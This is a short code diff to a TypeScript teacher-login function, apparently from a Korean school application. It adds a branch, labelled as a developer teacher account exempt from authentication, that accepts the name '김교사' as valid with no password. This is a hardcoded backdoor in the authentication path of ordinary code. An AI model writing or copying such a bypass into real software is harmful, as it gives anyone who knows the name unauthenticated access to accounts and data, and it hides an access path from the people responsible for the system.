@@ -14,12 +14,21 @@ export async function verifyTeacherPassword(
     teacherName: string | null | undefined,
     presentedPassword: string | null | undefined
 ): Promise<{ valid: boolean; trimmedName: string; cleanName: string; expectedPassword?: string }> {
-    if (!env?.DB || !teacherName || !presentedPassword) {
+    if (!env?.DB || !teacherName) {
         return { valid: false, trimmedName: '', cleanName: '' };
     }
     const trimmedName = teacherName.trim().replace(/선생님$/, '').trim();
     const cleanName = normalizeTeacherName(teacherName);
-    if (!cleanName || !presentedPassword.trim()) {
+    if (!cleanName) {
+        return { valid: false, trimmedName, cleanName };
+    }
+
+    // 개발자 교사 계정 ("김교사"): 인증 면제
+    if (cleanName === '김교사') {
+        return { valid: true, trimmedName, cleanName, expectedPassword: '' };
+    }
+
+    if (!presentedPassword || !presentedPassword.trim()) {
         return { valid: false, trimmedName, cleanName };
     }
 
